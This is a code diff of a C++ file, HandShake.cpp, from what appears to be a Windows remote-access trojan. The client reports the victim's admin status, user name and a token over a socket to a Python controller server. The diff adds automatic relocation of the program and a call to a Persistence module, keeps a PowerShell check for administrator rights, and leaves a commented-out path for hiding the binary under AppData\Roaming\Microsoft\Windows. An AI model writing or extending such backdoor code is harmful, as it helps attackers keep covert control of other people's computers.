@@ -6,7 +6,6 @@
 //#include <stdlib.h>
 
 #include "../inc/HandShake.h"
-#include "../inc/ModShell.h"
 #include "../inc/Persistence.h"
 #include "../inc/common.h"
 #include "../inc/other.h"
@@ -20,17 +19,34 @@ HandShake::HandShake()
     a_is_admin = setIsAdmin();
     a_current_directory = setCurrentDirectory();
     a_name_prog = NAME_PROG;
-    a_location_prog = setLocationProg();
-    cout << "LOCATION PROG: " << endl;
     a_token = TOKEN;
     cout << "TOKEN: " << a_token << endl;
+    a_location_prog = setLocationProg();
+    cout << "LOCATION PROG: "<<a_location_prog << endl;
 
 }
 void HandShake::setSock(int sock)
 {
     a_sock = sock;
 }
-int HandShake::startHandShake()
+void HandShake::beforeHandShake()
+{
+    if(AUTO_MOVE) 
+    {
+        cout << "[+] move prog go" << endl;
+        moveProg();
+    }
+    a_location_prog = setLocationProg();
+    cout << "LOCATION PROG: "<<a_location_prog << endl;
+    
+    if(AUTO_PERSISTENCE)
+    {
+        Persistence(a_is_admin, a_location_prog).main();
+    }
+
+}
+
+void HandShake::startHandShake()
 {
     // ' SPLIT ' for split data in python server.py script
     string is_admin;
@@ -59,86 +75,15 @@ int HandShake::startHandShake()
     sendUltraSafe(a_sock, name_user);
     sendUltraSafe(a_sock, token);
     sendUltraSafe(a_sock, "\r\n");
-
-
 //010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
 //010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
 
-    cout << "\n\n[+] second part of handshake  goooo !!" << endl;
-    //Gets all the parameters that the server sends during the handshake.
-    string result;
-    int i_recv = 0;
-    char buffer[BUFFER_LEN];
-    bool auto_persi = false; //default
-    int index=0;
-
-
-    while(true)
-    {   
-        if(i_recv > 14)
-        {
-            //avoid errors if the function runs in a loop
-            cout << "Must itterator !" << endl;
-            break;
-        }
-
-        string result = recvUltraSafe(a_sock);
-        
-        index =  result.find(SPLIT);
-        cout << "INDEX: " << index << endl;
-        cout << "RESULT: " << result << endl;
-    
-        if(index != string::npos)
-        {
-            cout <<"--->"<< result << endl;
-            cout << "LEN -->" << result.length() << endl;
-            cout << result.substr((index+strlen(SPLIT)), result.length()) << endl;
-            cout << result.substr(0, index)  << "<-----" <<endl;
-            cout << "INDEX FIND: " << index << endl;
-            
-            if(result.substr(0,index) == "MOD_HANDSHAKE_AUTO_PERSISTENCE")
-            {
-                //All informations in MOD_HANDSHAKE_AUTO_PERSISTENCE
-                cout << "MOD_HANDSHAKE_AUTO_PERSISTENCE ok" << endl;
-                if(result.substr((index+strlen(SPLIT)),result.length())== "True")
-                {
-                    cout << "IS: " << result.substr((index+strlen(SPLIT))) << endl;
-
-                    Persistence(a_is_admin,a_location_prog).main();
-                }
-                
-                else if (result.substr((index+strlen(SPLIT)),result.length())== "False")
-                {
-                    cout << "IS: " << result.substr((index+strlen(SPLIT)),result.length()) << endl;
-                }
-                else
-                {
-                    cout << "Error  in recv MOD_HANDSHAKE_AUTO_PERSISTENCE" << endl;
-                }
-            }    
-
-            result.erase();        
-        }
-        else if(result == "\r\n")
-        {
-            cout << "end handshake" << endl;
-            break;
-        }
-        else // Not index find 
-        {
-            cout << "NOT FIND INDEX" << endl;
-        }
-        ++i_recv;
-    }
-    
-    return 0;
 }
-
 bool HandShake::setIsAdmin()
 {
     string result;
     cout << "call getamdin" << endl;
-    ModShell().exec("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"",result);
+    result = exec("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
     if(result.substr(0,4) == "True") //remove ruturn line.
     {
         //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
@@ -187,14 +132,32 @@ string HandShake::setCurrentDirectory()
 
 string HandShake::setLocationProg()
 {
-    //if admin
-    string result;
+    char buffer[MAX_PATH];
 
-    if(AUTO_MOVE)
+    if(GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0)//if error
+    {   
+        if(_getcwd(buffer,sizeof(buffer)) == 0)//if error
+        {
+            string result_cmd;
+            result_cmd = exec("pwd");
+            return (string) result_cmd + "\\" + NAME_PROG;
+        }
+        else
+        {
+            return (string) buffer;
+        }
+    }
+    else
     {
+        return (string) buffer;        
+    }
+
+    //if admin
+    
+        /*
         if(a_is_admin)
         {
-            result =   PATH_ADMIN "\\" + a_name_prog;
+            result = PATH_ADMIN "\\" + a_name_prog;
         }
         else
         {
@@ -215,14 +178,7 @@ string HandShake::setLocationProg()
                 result = "C:\\Users\\"+ a_name_user+"\\AppData\\Roaming\\Microsoft\\Windows\\" + a_name_prog;
             }
         }
-    }
-    else
-    {
-        char buffer[MAX_PATH];
-        GetModuleFileNameA(NULL, buffer, sizeof(buffer));
-        result = buffer;
-    }
-    return result;
+        */
 }
 bool HandShake::getIsAdmin()
 {
